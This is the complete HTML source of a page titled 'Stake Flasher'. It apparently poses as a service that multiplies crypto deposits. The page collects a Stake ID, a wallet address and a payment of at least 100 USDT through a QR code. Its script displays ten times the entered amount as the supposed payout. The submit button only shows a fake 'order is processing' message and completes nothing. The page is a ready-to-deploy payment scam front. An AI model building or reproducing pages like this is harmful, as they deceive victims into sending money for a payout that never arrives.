
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Stake Flasher</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      width: 80%;
      font-size: 16px;
    }
    #statusMessage {
      color: yellow;
      font-weight: bold;
      margin-top: 20px;
    }
    #conversionResult {
      color: cyan;
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>Stake Flasher</h1>

  <p><strong>Stake ID:</strong></p>
  <input type="text" placeholder="Enter your Stake ID" required />

  <p><strong>Wallet Address:</strong></p>
  <input type="text" placeholder="Enter Wallet Address" required />

  <p><strong>Amount (Minimum 100 USDT):</strong></p>
  <input type="number" id="amountInput" placeholder="Enter USDT Amount" required oninput="updateUSDTValue()"/>
  <div id="conversionResult"></div>

  <p><strong>Scan QR to Pay:</strong></p>
  <img src="qr-code.png" alt="QR Code" width="200"/>

  <form id="myForm" onsubmit="return showProcessingMessage(event)">
    <button type="submit">Submit</button>
  </form>

  <p id="statusMessage"></p>

  <script>
    function updateUSDTValue() {
      const input = document.getElementById("amountInput").value;
      const result = document.getElementById("conversionResult");

      if (input && !isNaN(input)) {
        const converted = parseFloat(input) * 10;
        result.innerText = converted + " USDT";
      } else {
        result.innerText = "";
      }
    }

    function showProcessingMessage(event) {
      event.preventDefault();
      document.getElementById("statusMessage").innerText =
        "Your order is processing, please wait some time...";
      return false;
    }
  </script>
</body>
</html>
